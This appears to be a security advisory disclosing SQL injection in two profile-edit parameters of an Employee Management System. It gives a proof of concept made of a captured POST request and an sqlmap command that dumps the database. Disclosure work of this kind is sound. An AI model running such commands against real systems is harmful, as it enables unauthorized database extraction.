Usually, it involves the insertion or \"injection\" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.\n\n### Affected Components:\n\n> /employee_akpoly/Admin/edit_profile.php\n\n> Two parameters `txtfullname` and `txtphone` within admin edit profile mechanism are vulnerable to SQL Injection.\n\n\n![txtfullname](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/admin_edit_txtfullname_sqli.png?raw=true)\n\n![txtphone](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/admin_edit_txtphone_sqli.png?raw=true)\n\n### Description:\n\n> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.\n\n## Proof of Concept:\n\n### SQLMap\n\nSave the following request to `edit_profile.txt`:\n\n```\nPOST /employee_akpoly/Admin/edit_profile.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 88\nOrigin: http://localhost\nConnection: close\nReferer: http://localhost/employee_akpoly/Admin/edit_profile.php\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n\ntxtfullname=Caroline+Bassey&txtphone=0905656&old_image=uploadImage%2Fbird.jpg&btnupdate=\n```\n\nUse `sqlmap` with `-r` option to exploit the vulnerability:\n\n```\nsqlmap -r edit_profile.txt --level 5 --risk 3 --batch --dbms MYSQL --dump\n```\n\n\n## Recommendations\n\nWhen using this Employee Management System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.\n            "}
